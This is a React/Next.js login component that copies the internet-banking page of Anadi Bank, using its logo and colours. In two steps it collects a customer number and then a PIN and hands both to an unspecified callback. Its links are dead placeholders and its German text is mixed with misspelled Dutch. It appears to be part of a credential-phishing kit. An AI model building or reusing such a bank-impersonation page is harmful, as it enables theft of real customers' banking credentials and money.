"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function AnadiBank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen w-full relative flex flex-col font-sans">
      {/* Background Image */}
      <div className="absolute inset-0 z-0">
        <Image 
          src="/anadi-bg.webp" 
          alt="Background" 
          fill
          className="object-cover object-center"
          priority
        />
      </div>

      {/* Top Banner */}
      <div className="relative z-20 w-full bg-[#ffcc00] h-[80px] flex items-center px-8 shadow-sm">
        <div className="relative w-[200px] h-[45px]">
          <Image 
            src="/anadi-logo.svg" 
            alt="Anadi Bank" 
            fill
            className="object-contain object-left"
          />
        </div>
      </div>

      {/* Main Content Area */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        
        {/* Login Card */}
        <div className="bg-white w-full max-w-[500px] shadow-lg rounded-sm overflow-hidden mt-[-80px]">
          
          {/* Header Strip */}
          <div className="bg-[#ffcc00] px-6 py-4">
            <h1 className="text-[20px] font-medium text-[#333]">
              Login
            </h1>
          </div>

          <div className="p-6 md:p-8">
            <p className="text-[13px] text-[#555] mb-8 leading-relaxed">
              Melden Sie sich mit Ihrem Gebruikersnaamn und Wachtwoord im Internetbanking an.<br/>
              Gehen Sie mit Ihren Zugangsdaten sorgsam um.
            </p>

            <form 
              onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
              className="flex flex-col"
            >
              {step === 1 ? (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[13px] text-[#333]">Gebruikersnaam</label>
                    <div className="text-[12px] text-[#004b87]">
                      <a href="#" className="hover:underline">Barrierefreiheit</a>
                      <span className="mx-1">|</span>
                      <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  
                  <input 
                    type="text"
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
                  />
                </>
              ) : (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[13px] text-[#333]">Wachtwoord</label>
                    <div className="text-[12px] text-[#004b87]">
                      <a href="#" className="hover:underline">Barrierefreiheit</a>
                      <span className="mx-1">|</span>
                      <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  
                  <input 
                    type="password"
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    autoFocus
                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
                  />
                </>
              )}

              {/* Submit Button */}
              <button 
                type="submit" 
                disabled={saving} 
                className="w-full bg-[#ffcc00] hover:bg-[#e6b800] text-[#333] py-[12px] font-medium text-[15px] rounded-[3px] transition-colors disabled:opacity-70 mb-6"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>

              {/* Secondary Links */}
              <div className="flex flex-col items-center gap-2">
                <a href="#" className="text-[13px] text-[#004b87] hover:underline">
                  Gebruikersnaamn vergessen?
                </a>
                <a href="#" className="text-[13px] text-[#004b87] hover:underline flex items-center gap-1.5 mt-1">
                  <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                    <circle cx="12" cy="12" r="10" strokeWidth="1.5"/>
                    <path d="M12 16v-4" strokeWidth="1.5"/>
                    <path d="M12 8h.01" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                  Brauchen Sie Hilfe?
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
